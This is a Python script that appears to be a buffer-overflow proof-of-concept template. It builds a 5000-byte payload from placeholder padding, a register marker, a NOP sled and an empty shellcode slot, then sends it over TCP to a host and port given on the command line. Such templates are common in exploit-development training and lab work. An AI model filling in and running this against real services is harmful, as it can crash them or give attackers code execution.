#!/usr/bin/python3
import sys, struct
import argparse
import socket
import os
import traceback

# Set timeout
timeout = 3

# Handle CTRL-C
def keyboard_interrupt():
    """Handles keyboardinterrupt exceptions"""""
    print("\n\n[*] User requested an interrupt, exiting...")
    exit(0)

def create_buf():
    # Lengths
    lentotal = 5000
    lenprefix = 200
    lennop = 32
    lenfiller = 64
    lenreg = 4

    # Constructing vars
    prefix = b"A" * lenprefix
    crash_reg = b"B" * lenreg
    filler = b"E" * lenfiller
    offset = b"C" * lenreg
    suffixchar = b"D"

    # NOP
    nop = b"\x90" * lennop

    # Shellcode
    shellcode = b""

    # Building payload
    payload = b""
    payload += prefix
    payload += crash_reg
    payload += filler
    payload += offset
    payload += nop
    payload += shellcode
    payload += suffixchar * (lentotal - len(payload))

    return payload

#######
# ANY OTHER FUNCTION HERE
#######

# Main
def main(argv):
    parser = argparse.ArgumentParser(description='Network POC')
    parser.add_argument("--host", "-i", required=True, help="The host of the target.")
    parser.add_argument("--port", "-p", required=True, help="The port of the target")
    args = parser.parse_args()

    # Vars
    host = args.host
    port = args.port

    try:
        print("Sending buffer...")
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((host, int(port)))
        s.send(create_buf())
        s.close()
        print("Done!")
    except Exception:
        traceback.print_exc()
        sys.exit(0)
    except KeyboardInterrupt:
        keyboard_interrupt()

# If we were called as a program, go execute the main function.
if __name__ == "__main__":
    main(sys.argv[1:])
